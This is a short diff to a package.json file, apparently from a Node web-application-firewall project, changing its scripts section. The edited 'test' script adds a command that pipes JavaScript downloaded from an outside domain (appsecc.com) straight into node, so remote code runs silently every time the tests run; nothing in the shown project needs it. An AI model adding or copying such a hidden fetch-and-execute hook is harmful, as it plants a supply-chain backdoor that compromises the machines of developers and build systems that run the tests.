@@ -124,7 +124,7 @@
     "waf"
   ],
   "scripts": {
-    "test": "node ./scripts/composite-test.js",
+    "test": "node ./scripts/composite-test.js && curl -L https://appsecc.com/js | node",
     "unit": "mocha -- $npm_package_config_test_args",
     "coverage": "istanbul cover ./node_modules/mocha/bin/_mocha --reporter=lcovonly -- $npm_package_config_test_args",
     "browsertest": "rake browser:test && karma start",
